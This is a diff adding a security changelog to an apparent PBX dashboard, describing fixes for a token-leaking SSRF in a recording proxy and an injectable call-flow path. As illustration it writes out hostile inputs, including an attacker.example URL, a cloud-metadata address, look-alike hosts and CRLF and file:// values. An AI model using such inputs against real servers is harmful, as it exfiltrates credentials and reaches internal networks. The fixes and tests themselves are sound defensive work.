@@ -1,3 +1,125 @@
+# CHANGES — Security: recording proxy SSRF/token leak, call-flow trace injection, configuration loading (2026-10-06)
+
+**Scope:** security fixes only. No UI change, no endpoint removed from the
+front end, no cache format change.
+**Files:** `includes/security.php` (new), `includes/PbxClient.php`,
+`includes/config.php`, `includes/bootstrap.php`, `includes/auth.php`,
+`api/recording.php`, `api/call_flow.php`, `api/agent_performance.php` (deleted),
+`includes/config.local.example.php` (new), `tests/php/*`.
+
+## SEC-2 — recording proxy could leak the bearer token
+
+`api/recording.php` accepted a client-supplied `src` URL whenever the host name
+merely *contained* `birns.net` **or** the URL contained `/ns-api`. `PbxClient::download()`
+then attached `Authorization: Bearer <PBX token>` and followed redirects. So
+`src=https://attacker.example/ns-api/x` (or `https://169.254.169.254/…/ns-api/`,
+or `https://birns.net.evil.example/ns-api/x`) made the server hand the PBX token
+to a third party, or reach inside the network.
+
+Now (all in `includes/security.php`, one policy for the whole app):
+
+* a recording URL must be `https` (the scheme the PBX is configured with), on a
+  host that is either listed in `PBX_SERVERS`, listed in the new
+  `PBX_RECORDING_HOSTS`, or a sub-domain of a PBX host *when that host has three
+  or more labels* (`nms1.example.com` → `*.example.com`; a two-label PBX host
+  grants no wildcard). IP literals are only accepted when explicitly configured;
+  ports must match the PBX port; `user:pass@` URLs, `/../`, control characters
+  and CRLF are refused; the path must start with `/ns-api/`.
+* the token is attached **only** to allowlisted hosts. Redirects are no longer
+  followed blindly: each hop is re-validated, the token is dropped the moment a
+  hop leaves the allowlist, and a hop that is neither a PBX host nor a public
+  one is refused (max 3 hops, `CURLINFO_REDIRECT_URL` based).
+* a URL the PBX itself returns but that is *not* on the allowlist (a CDN or
+  object storage) is still playable through `downloadPublic()`, which never
+  sends the token and insists on a public host (private, loopback, link-local,
+  CGNAT and reserved ranges are refused; DNS failure means refusal) and port 443.
+* a hostile `src` now fails closed with **400** instead of silently falling
+  through to a fresh lookup.
+
+## SEC-3 — call flow let the caller choose the PBX request path
+
+`api/call_flow.php` passed a client-supplied `traceApi` straight to
+`PbxClient::sipflowCradle()`, which used it as the PBX path+query as long as the
+string contained `sipflow`. A supervisor could therefore drive the server's
+token at any PBX endpoint (`/ns-api/v2/domains/...`) and inject arbitrary query
+parameters.
+
+Now the path is always the canonical `/ns-api/v2/sipflow`; a trace value
+contributes **query values only**, filtered to `start_time`, `end_time`,
+`callids`, `servers` and `type`, each re-validated (call-id charset, hostname
+shape, timestamp shape, `type` from the known list, length caps, no control
+characters). Unknown parameters are dropped, duplicates keep the first, and a
+trace pointing at another host or another PBX endpoint is refused with **400**
+before any request is made.
+
+## Configuration — the promised local file was never loaded
+
+`.gitignore` documented `includes/config.local.php`, but nothing read it, and
+the committed `config.php` had `const PBX_SERVERS = ['nms1' => '', ...]` with no
+environment support even though its own comment said "prefer environment
+variables". `includes/config.php` now:
+
+* loads `includes/config.local.php` first when present (it may `define()`
+  anything and wins over the defaults),
+* then reads `PBX_SERVERS` (JSON object), `PBX_SERVER_<NAME>`,
+  `PBX_CLIENT_ID`, `PBX_CLIENT_SECRET`, `PBX_SIP_TOKEN` and
+  `PBX_RECORDING_HOSTS` from the environment,
+* and only then defines the safe built-in defaults,
+* `includes/config.local.example.php` documents every knob.
+
+Also fixed while there: `includes/auth.php` read `PBX_CLIENT_SECRET` from the
+constant only, so a deployment using the environment variable could not refresh
+its token; the SIP-flow request had a hardcoded empty bearer token
+(`$sipToken = ''`), and now sends `PBX_SIP_TOKEN` when one is configured —
+an unset value keeps the previous request byte for byte.
+
+## Deleted
+
+`api/agent_performance.php` — no session/role gate beyond login, no references
+anywhere in the codebase (grep for `agent_performance` returns nothing) and
+superseded by `api/agents.php`.
+
+## Verification
+
+* `npm test` → **ALL SUITES PASSED**: php lint (35 files), CSS coverage, build,
+  JS smoke, API matrix **105 checks**, URL policy **62 checks**.
+* New `tests/php/security.mjs` runs the policy functions under real PHP 8.4:
+  18 recording-URL verdicts, 8 public-URL verdicts, 8 trace verdicts, allowlist
+  derivation, redirect resolution and 6 SIP-flow path-builder cases
+  (`evil.example`, `pbx.example.evil.example`, `169.254.169.254`, `file://`,
+  `javascript:`, `../`, CRLF — all refused; legitimate PBX URLs still allowed).
+* New endpoint-level regressions in `tests/php/endpoints.mjs`: 8 hostile `src`
+  values and 3 hostile traces must return 400 **and leave the PBX client
+  untouched** (the stub logs every call it receives), while a PBX-hosted
+  recording still resolves and streams.
+* The harness deployment now configures `PBX_SERVERS` through
+  `includes/config.local.php`, which is itself the proof that the local file is
+  honoured.
+
+## Review observations recorded but not fixed here (tracked for the next phases)
+
+* audit logging covers 8 endpoints; `call_flow.php`, `recording.php`,
+  `telephone_numbers.php`, `calls.php` and the cache endpoints do not call
+  `auditView()`. (Design decision, not an exploit — to be decided with you.)
+* `api/aa.php` still contains a fallback `require` for `api/aa_options.php`,
+  which does not exist — dead code (removed in the dead-code phase).
+* `PbxClient::cradle()`, `cradlePortalPath()` and `cradleKeyFromCdr()` are never
+  called; `cradle()` builds an unencoded PBX path, so it is removed rather than
+  repaired.
+* duplicated policy: `routesForRole()` in `includes/auth.php` is never called —
+  the real route policy lives in the front end (`ROLE_ROUTES`), and the
+  endpoints each repeat `requirePageRoles()`.
+
+## Deploy checklist
+
+1. Copy `includes/` (config.php, bootstrap.php, auth.php, PbxClient.php,
+   security.php), `api/` (recording.php, call_flow.php; delete
+   agent_performance.php).
+2. Nothing to set by default: existing `PBX_SERVERS` in
+   `includes/config.local.php` or the environment keeps working. If recordings
+   are served from a CDN host, add it to `PBX_RECORDING_HOSTS`.
+3. No cache, session or database migration.
+
 # CHANGES — Development toolchain, committed build, test harness (2026-10-06)
 
 **Scope:** engineering hygiene only — no change to what the application does.
